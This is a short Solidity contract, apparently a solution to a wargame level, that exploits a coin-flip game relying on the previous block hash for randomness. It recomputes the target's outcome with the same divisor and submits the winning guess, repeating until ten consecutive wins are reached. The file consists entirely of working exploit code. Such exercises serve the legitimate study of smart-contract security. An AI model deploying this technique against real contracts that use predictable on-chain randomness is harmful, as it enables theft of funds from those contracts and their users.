// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlipInterface {
    function consecutiveWins() external view returns (uint256);
    function flip(bool _guess) external returns (bool);

}

contract CoinFlipCheat {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address CoinFlip;
  constructor(address _target) public {
    CoinFlip = _target;
  }

  function cheat() public {
    if(CoinFlipInterface(CoinFlip).consecutiveWins() >= 10) {
      revert();
    }

    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    CoinFlipInterface(CoinFlip).flip(side);
  }
}